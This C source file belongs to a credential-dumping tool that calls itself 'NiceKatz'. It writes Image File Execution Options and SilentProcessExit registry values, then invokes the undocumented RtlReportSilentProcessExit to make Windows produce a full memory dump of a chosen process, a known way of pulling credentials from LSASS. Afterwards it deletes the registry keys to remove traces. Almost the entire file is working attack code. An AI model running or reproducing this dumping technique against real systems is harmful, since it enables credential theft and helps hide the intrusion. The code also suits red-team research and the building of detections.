#include "SilentProcessExit.h"

BOOL SilentProcessExit(HANDLE hTarget, int TargetPid, pCommandLineArgs pCmdArgs)
{
    WCHAR IEFORegKey[MAX_PATH] = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
    WCHAR SPERegKey[MAX_PATH] = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\";

    WCHAR TargetProcessName[MAX_PATH];
    if (!GetProcessNameByPid(TargetPid, TargetProcessName))
    {
        return FALSE;
    }

    wcscat_s(IEFORegKey, MAX_PATH, TargetProcessName);
    wcscat_s(SPERegKey, MAX_PATH, TargetProcessName);

    if (!SetRegistry(IEFORegKey, SPERegKey))
    {
        return FALSE;
    }

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == NULL)
    {
        printf("[-] Failed to get handle to NTDLL\n");
        GetError(L"GetModuleHandle");
        return FALSE;
    }

    printf("[+] Dumping PID %d via SilentProcessExit\n", pCmdArgs->TargetgPid);

    RtlReportSilentProcessExit = (_RtlReportSilentProcessExit)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");
    if (RtlReportSilentProcessExit == NULL)
    {
        printf("[-] Could not find RtlReportSilentProcessExit in NTDLL");
        GetError(L"GetProcAddress");
        return FALSE;
    }

    NTSTATUS status = RtlReportSilentProcessExit(hTarget, 1);
    if (status != ERROR_SUCCESS)
    {
        printf("[-] Unable to call RtlReportSilentProcessExit on the target process\n");
        return FALSE;
    }

    printf("[+] PID %d dumped successfully\n", pCmdArgs->TargetgPid);
    RegDelnode(HKEY_LOCAL_MACHINE, IEFORegKey);
    RegDelnode(HKEY_LOCAL_MACHINE, SPERegKey);

    return TRUE;
}

BOOL GetProcessNameByPid(int TargetPid, WCHAR* TargetProcessName)
{
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        GetError(L"CreateTollhelp32Snapshot");
        return FALSE;
    }

    if (!Process32First(hSnapshot, &pe))
    {
        GetError(L"Process32First");
        return FALSE;
    }

    do {
        if (pe.th32ProcessID == TargetPid)
        {
            lstrcpyW(TargetProcessName, pe.szExeFile);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe));

    printf("[-] NiceKatz was unable to retrieve process name of PID: %d\n", TargetPid);
    GetError(L"Process32Next");
    return FALSE;
}

BOOL SetRegistry(WCHAR* IEFORegKey, WCHAR* SPERegKey)
{
    HKEY hIFEORegKey;
    NTSTATUS status = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        IEFORegKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &hIFEORegKey,
        NULL);
    if (status != ERROR_SUCCESS)
    {
        GetError(L"RegCreateKeyEx");
        return FALSE;
    }

    DWORD dwGlobalFlagValue = FLG_MONITOR_SILENT_PROCESS_EXIT;
    status = RegSetValueEx(hIFEORegKey, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&dwGlobalFlagValue, sizeof(DWORD));
    if (status != ERROR_SUCCESS)
    {
        GetError(L"RegSetValueEx");
        goto IEFOCleanup;
    }

    HKEY hSPERegKey;
    status = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        SPERegKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE,
        NULL,
        &hSPERegKey,
        NULL);
    if (status != ERROR_SUCCESS)
    {
        GetError(L"RegCreateKeyEx");
        goto IEFOCleanup;
    }

    DWORD dwDumpTypeValue = FLG_DUMP_TYPE;
    status = RegSetValueEx(hSPERegKey, L"DumpType", 0, REG_DWORD, (const BYTE*)&dwDumpTypeValue, sizeof(DWORD));
    if (status != ERROR_SUCCESS)
    {
        GetError(L"RegSetValueEx");
        goto SPECleanup;
    }

    DWORD dwReportingModeValue = FLG_REPORTING_MODE;
    status = RegSetValueEx(hSPERegKey, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&dwReportingModeValue, sizeof(DWORD));
    if (status != ERROR_SUCCESS)
    {
        GetError(L"RegSetValueEx");
        goto SPECleanup;
    }

    DWORD dwBufferLength = MAX_PATH;
    WCHAR Buffer[MAX_PATH] = { 0 };
    if (GetCurrentDirectory(dwBufferLength, &Buffer))
    {
        status = RegSetValueEx(hSPERegKey, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)&Buffer, sizeof(Buffer));
        if (status != ERROR_SUCCESS)
        {
            printf("[!] Failed to set LocalDumpFolder. output dmp file will be wrriten to: \%TEMP%\\Silent Process Exit\n");
        }
    }

    RegCloseKey(hIFEORegKey);
    RegCloseKey(hSPERegKey);
    return TRUE;

SPECleanup:
    RegCloseKey(hSPERegKey);
    RegDelnode(HKEY_LOCAL_MACHINE, SPERegKey);

IEFOCleanup:
    RegCloseKey(hIFEORegKey);
    RegDelnode(HKEY_LOCAL_MACHINE, IEFORegKey);
    return FALSE;

}

BOOL RegDelnode(HKEY hKeyRoot, LPWSTR lpSubKey)
{
    WCHAR szDelKey[MAX_PATH * 2];

    wcscpy_s(szDelKey, MAX_PATH * 2, lpSubKey);
    return RegDelnodeRecurse(hKeyRoot, szDelKey);
}

BOOL RegDelnodeRecurse(HKEY hKeyRoot, LPWSTR lpSubKey)
{
    LPWSTR lpEnd;
    NTSTATUS status;
    DWORD dwSize;
    WCHAR szName[MAX_PATH];
    HKEY hKey;
    FILETIME ftWrite;

    status = RegDeleteKey(hKeyRoot, lpSubKey);
    if (status == ERROR_SUCCESS)
        return TRUE;

    status = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS)
    {
        if (status == ERROR_FILE_NOT_FOUND)
        {
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }

    lpEnd = lpSubKey + lstrlen(lpSubKey);
    if (*(lpEnd - 1) != L'\\')
    {
        *lpEnd = L'\\';
        lpEnd++;
        *lpEnd = L'\0';
    }

    dwSize = MAX_PATH;
    status = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL, NULL, NULL, &ftWrite);
    if (status == ERROR_SUCCESS)
    {
        do {

            *lpEnd = L'\0';
            wcscat_s(lpSubKey, MAX_PATH * 2, szName);

            if (!RegDelnodeRecurse(hKeyRoot, lpSubKey))
            {
                break;
            }

            dwSize = MAX_PATH;

            status = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (status == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = L'\0';

    RegCloseKey(hKey);

    status = RegDeleteKey(hKeyRoot, lpSubKey);
    if (status == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}
